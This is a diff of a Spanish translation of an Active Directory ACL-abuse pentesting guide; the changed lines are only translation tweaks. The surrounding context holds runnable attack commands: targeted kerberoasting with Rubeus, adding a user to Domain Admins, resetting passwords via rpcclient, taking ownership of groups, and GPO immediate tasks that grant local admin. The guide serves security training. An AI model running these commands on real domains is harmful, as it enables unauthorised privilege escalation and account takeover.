@@ -1,4 +1,4 @@
-# Abuso de ACLs/ACEs de Active Directory
+# Abusando de ACLs/ACEs de Active Directory
 
 {{#include ../../../banners/hacktricks-training.md}}
 
@@ -9,7 +9,7 @@
 Este privilegio otorga a un atacante control total sobre una cuenta de usuario objetivo. Una vez que se confirman los derechos `GenericAll` utilizando el comando `Get-ObjectAcl`, un atacante puede:
 
 - **Cambiar la Contraseña del Objetivo**: Usando `net user <username> <password> /domain`, el atacante puede restablecer la contraseña del usuario.
-- **Kerberoasting Dirigido**: Asignar un SPN a la cuenta del usuario para que sea susceptible de kerberoasting, luego usar Rubeus y targetedKerberoast.py para extraer e intentar descifrar los hashes del ticket-granting ticket (TGT).
+- **Kerberoasting Dirigido**: Asignar un SPN a la cuenta del usuario para hacerla susceptible a kerberoasting, luego usar Rubeus y targetedKerberoast.py para extraer e intentar romper los hashes del ticket-granting ticket (TGT).
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
@@ -40,7 +40,7 @@ Tener estos privilegios en un objeto de computadora o una cuenta de usuario perm
 
 Si un usuario tiene derechos de `WriteProperty` en todos los objetos para un grupo específico (por ejemplo, `Domain Admins`), puede:
 
-- **Add Themselves to the Domain Admins Group**: Alcanzable mediante la combinación de los comandos `net user` y `Add-NetGroupUser`, este método permite la escalación de privilegios dentro del dominio.
+- **Add Themselves to the Domain Admins Group**: Alcanzable mediante la combinación de los comandos `net user` y `Add-NetGroupUser`, este método permite la escalada de privilegios dentro del dominio.
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
@@ -70,7 +70,7 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-## **WriteOwner en el Grupo**
+## **WriteOwner en Grupo**
 
 Si un atacante descubre que tiene derechos de `WriteOwner` sobre un grupo, puede cambiar la propiedad del grupo a sí mismo. Esto es particularmente impactante cuando el grupo en cuestión es `Domain Admins`, ya que cambiar la propiedad permite un control más amplio sobre los atributos y la membresía del grupo. El proceso implica identificar el objeto correcto a través de `Get-ObjectAcl` y luego usar `Set-DomainObjectOwner` para modificar el propietario, ya sea por SID o por nombre.
 ```powershell
@@ -112,13 +112,13 @@ El ataque DCSync aprovecha permisos de replicación específicos en el dominio p
 
 ### Delegación de GPO
 
-El acceso delegado para gestionar Objetos de Política de Grupo (GPO) puede presentar riesgos de seguridad significativos. Por ejemplo, si un usuario como `offense\spotless` tiene derechos de gestión de GPO delegados, puede tener privilegios como **WriteProperty**, **WriteDacl** y **WriteOwner**. Estos permisos pueden ser abusados para fines maliciosos, como se identifica usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+El acceso delegado para gestionar Objetos de Política de Grupo (GPO) puede presentar riesgos de seguridad significativos. Por ejemplo, si un usuario como `offense\spotless` tiene derechos de gestión de GPO, puede tener privilegios como **WriteProperty**, **WriteDacl** y **WriteOwner**. Estos permisos pueden ser abusados con fines maliciosos, como se identifica usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 ### Enumerar Permisos de GPO
 
-Para identificar GPO mal configurados, se pueden encadenar los cmdlets de PowerSploit. Esto permite descubrir GPOs que un usuario específico tiene permisos para gestionar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Para identificar GPOs mal configurados, se pueden encadenar los cmdlets de PowerSploit. Esto permite descubrir GPOs que un usuario específico tiene permisos para gestionar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Computadoras con una Política Dada Aplicada**: Es posible resolver qué computadoras se aplica una GPO específica, ayudando a entender el alcance del impacto potencial. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Computadoras con una Política Dada Aplicada**: Es posible resolver qué computadoras se ven afectadas por un GPO específico, ayudando a entender el alcance del impacto potencial. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
 **Políticas Aplicadas a una Computadora Dada**: Para ver qué políticas se aplican a una computadora en particular, se pueden utilizar comandos como `Get-DomainGPO`.
 
@@ -126,7 +126,7 @@ Para identificar GPO mal configurados, se pueden encadenar los cmdlets de PowerS
 
 ### Abusar de GPO - New-GPOImmediateTask
 
-Los GPO mal configurados pueden ser explotados para ejecutar código, por ejemplo, creando una tarea programada inmediata. Esto se puede hacer para agregar un usuario al grupo de administradores locales en las máquinas afectadas, elevando significativamente los privilegios:
+Los GPOs mal configurados pueden ser explotados para ejecutar código, por ejemplo, creando una tarea programada inmediata. Esto se puede hacer para agregar un usuario al grupo de administradores locales en las máquinas afectadas, elevando significativamente los privilegios:
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
